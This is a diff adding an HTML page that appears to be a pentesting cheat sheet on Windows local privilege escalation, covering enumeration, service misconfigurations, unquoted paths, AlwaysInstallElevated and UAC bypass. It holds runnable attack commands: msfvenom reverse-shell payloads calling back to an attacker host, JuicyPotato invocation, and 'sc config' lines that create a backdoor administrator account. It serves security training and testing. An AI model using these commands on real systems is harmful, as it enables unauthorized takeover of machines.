@@ -1,0 +1,222 @@
+I"�0<h2 id="system-enumeration">System enumeration</h2>
+
+<p><strong>Which OS the target is running? Are there any hot fixes installed?</strong></p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">systeminfo
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
+wmic qfe get Caption,Description,HotFixID,InstalledOn
+</span></code></pre></div></div>
+
+<p>Save the output of <em>systeminfo</em> in <em>systeminfo.txt</em> on your attacking machine and execute the following commands:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">python windows-exploit-suggester.py --update
+python windows-exploit-suggester.py --database 2020-03-09-mssb.xls --systeminfo systeminfo.txt
+</span></code></pre></div></div>
+
+<p><em>windows-exploit-suggester.py</em> can be found on <a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">AonCyberLabs Github</a>.</p>
+
+<div class="panel panel-info">
+      <div class="panel-heading">
+        <h3 class="panel-title">Info:</h3>
+      </div>
+      <div class="panel-body">
+   Since Microsoft stopped maintaining the security bulletin search; the Windows Exploit Suggester database will not include any vulnerabilities or
+exploits found after March 2017. Nevertheless, this is still a usefull tool for older machines.
+      </div>
+    </div>
+
+<p>Compiled Kernel exploit are available on <a href="https://github.com/SecWiki/windows-kernel-exploits/">SecWiki Github repository</a>.</p>
+
+<p><strong>Can we exploit 3rd party drivers?</strong></p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">driverquery /v
+</span></code></pre></div></div>
+
+<h2 id="user-enumeration">User enumeration</h2>
+
+<p><strong>Who am I running as? Which privileges do I have?</strong></p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">whoami
+whoami /all
+net user /priv
+net user
+net user username
+</span></code></pre></div></div>
+
+<p>If the user has SeImpersonate or SeAssignPrimaryToken privileges then you can use <a href="https://github.com/ohpe/juicy-potato">JuicyPotato</a> and become SYSTEM.</p>
+
+<p>To use the JuicyPotato exploit, run the following:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}
+</span></code></pre></div></div>
+
+<p>You can find a CLSID that works for your target from <a href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md">ohpe Github</a>. You can also change the process to be executed with a reverse shell to your target.</p>
+
+<p><em>Note: Windows Server 2019 is not affected by this vulnerability.</em></p>
+
+<h2 id="firewall-status-and-rules-enumeration">Firewall status and rules enumeration</h2>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">netsh advfirewall show currentprofile
+netsh advfirewall firewall show rule name=all
+</span></code></pre></div></div>
+
+<h2 id="process-enumeration">Process enumeration</h2>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">tasklist /SVC
+</span></code></pre></div></div>
+
+<h2 id="insecure-file-permissions-enumeration">Insecure file permissions enumeration</h2>
+
+<p><strong>Can we replace a service running as a privileged user? Can we modify its path?</strong></p>
+
+<p>Run the following command in Powershell and look for weird programs:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$</span>_.State <span class="nt">-like</span> <span class="s1">'Running'</span><span class="o">}</span>
+</code></pre></div></div>
+
+<p>Once you spot a weird service (Let’s refer to it as weird.exe from now on); use <em>icacls</em> to determine if the current user can modify it or not:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">icacls "c:\program files\weird.exe"
+</span></code></pre></div></div>
+
+<p>If the user can modify the program; you should see <em>BUILTIN\Users: (I)(F)</em> in the output of the above command. If this is the case; you can replace the program with a malicious one (same name) and restart it:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">net stop weird
+</span></code></pre></div></div>
+
+<p>If you do not have permission to restart the program; check its start mode. If it’s automatic;you can restart the machine instead:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">wmic service where caption="weird" get name, caption, state, startmode
+shutdown /r /t 0
+</span></code></pre></div></div>
+
+<p>Another way to exploit a misconfigured service is by changing its path using <em>sc config</em> command.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">sc config [service name] binpath= "malicious executable path"
+</span></code></pre></div></div>
+
+<p>You can even exploit the path to add a new admin user:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">sc config [service name] binpath= "net user admin password /add"
+sc config [service name] binpath= "net localgroup Administrators admin /add"
+</span></code></pre></div></div>
+
+<p>You will need to restart the service for the exploit to work:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">sc stop [service name]
+sc start [service name]
+</span></code></pre></div></div>
+
+<p><em>Note: <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">accesschk.exe</a> is also a very useful tool to check for service permissions on Windows.</em></p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">accesschk.exe -uwcqv "Authenticated Users" * /accepteula
+</span></code></pre></div></div>
+
+<p>If the authenticated user has write permissions to the service; the output of the above command would be: <em>RW [service name] SERVICE_ALL_ACCESS</em></p>
+
+<h2 id="unquoted-service-path-enumeration">Unquoted service path enumeration</h2>
+
+<div class="panel panel-info">
+      <div class="panel-heading">
+        <h3 class="panel-title">Info:</h3>
+      </div>
+      <div class="panel-body">
+    If an executable is enclosed in quote tags "" Windows will know where to find it when it attempts to execute it. However, if the executable is not enclosed in quote tags and the path contains one or more spaces; Windows will handle the space as a break and pass the rest of the service path as an argument. If we have write permissions to any of the folders containing spaces, we can exploit the unquoted service path vulnerability.
+      </div>
+    </div>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """
+</span></code></pre></div></div>
+
+<p>Let’s say we found an executable located under C:\Program Files\folder A\folder B\executable.exe and its path is not enclosed in quote tags.</p>
+
+<p>Let’s see if we have write permissions to any of the folders:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">icacls "C:\Program Files\"
+icacls "C:\Program Files\folder A"
+icacls "C:\Program Files\folder A\folder B"
+</span></code></pre></div></div>
+
+<p>If we had write permissions on the ‘C:' directory we can create the following payload: ‘C:\Program.exe’. This is highly unlikely though but it is very common to have write permissions in application directories. If we have permissions to write in the
+‘C:\Program Files\folder A’ directory we will put our reverse shell there and name it folder.exe.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">msfvenom -p windows/shell_reverse_tcp LHOST=[LHOST IP] LPORT=443 -f exe -o folder.exe
+</span></code></pre></div></div>
+
+<p>We can now either restart the service or the target if the service start mode is Auto.</p>
+
+<h2 id="binaries-that-auto-elevate-enumeration">Binaries that auto elevate enumeration</h2>
+
+<p>We need to check the status of the AlwaysInstallElevated registry setting. If this key is enabled (set to 1) in either HKEY_CURRENT_USER or HKEY_LOCAL_MACHINE, any user can run Windows Installer packages with elevated privileges.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+</span></code></pre></div></div>
+
+<p>Use <em>msfvenom</em> to create a malicious msi installer:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">msfvenom -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai LHOST=[LHOST IP]
+LPORT=443 -f msi -o exploit.msi
+</span></code></pre></div></div>
+
+<p>In order to execute the msi installer, run the following:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">msiexec /quiet /qn /i C:\Users\exploit.msi
+</span></code></pre></div></div>
+
+<p><em>Note:</em> To exploit this vulnerability with Metasploit you can use exploit/windows/local/always_install_elevated.</p>
+
+<h2 id="unattended-installs-enumeration">Unattended installs enumeration</h2>
+
+<div class="panel panel-info">
+      <div class="panel-heading">
+        <h3 class="panel-title">Info:</h3>
+      </div>
+      <div class="panel-body">
+    Unattended installations often use a file of predefined answers so that after starting the installation, it runs to completion without further user intervention. If administrators fail to clean up after such a process, an EXtensible Markup Language
+(XML) file called Unattend is left on the local system. This file may contain sensitive information.
+      </div>
+    </div>
+
+<p>Unattended files are most likely found under:</p>
+
+<ul>
+  <li>C:\Windows\Panther\</li>
+  <li>C:\Windows\Panther\Unattend\</li>
+  <li>C:\Windows\System32\</li>
+  <li>C:\Windows\System32\sysprep\</li>
+</ul>
+
+<p>Search the directories for these files:</p>
+
+<ul>
+  <li>Unattend.xml</li>
+  <li>Unattended.xml</li>
+  <li>Unattend.txt</li>
+  <li>sysprep.xml</li>
+  <li>sysprep.inf</li>
+</ul>
+
+<h2 id="uac-bypass">UAC bypass</h2>
+
+<p>In order to bypass UAC; you need to be part of the administrator’s group. Pentestlab published a detailed <a href="https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/">blog</a> on how to accomplish this using foothelper.exe.</p>
+
+<p><em>Note: You can bypass UAC with Metasploit using exploit/windows/local/bypassuac.</em></p>
+
+<h2 id="automated-scripts">Automated scripts</h2>
+
+<ol>
+  <li><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS">winPEAS</a></li>
+  <li><a href="https://github.com/411Hall/JAWS">JAWS</a></li>
+  <li><a href="https://github.com/M4ximuss/Powerless">Powerless</a></li>
+  <li><a href="https://github.com/rasta-mouse/Watson">Watson</a></li>
+  <li><a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc">PowerUp</a></li>
+</ol>
+
+<h3 id="references--further-readings">References &amp; Further readings</h3>
+
+<ul>
+  <li><a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation">https://book.hacktricks.xyz/windows/windows-local-privilege-escalation</a>*</li>
+  <li><a href="https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/">https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/</a></li>
+</ul>
+:ET
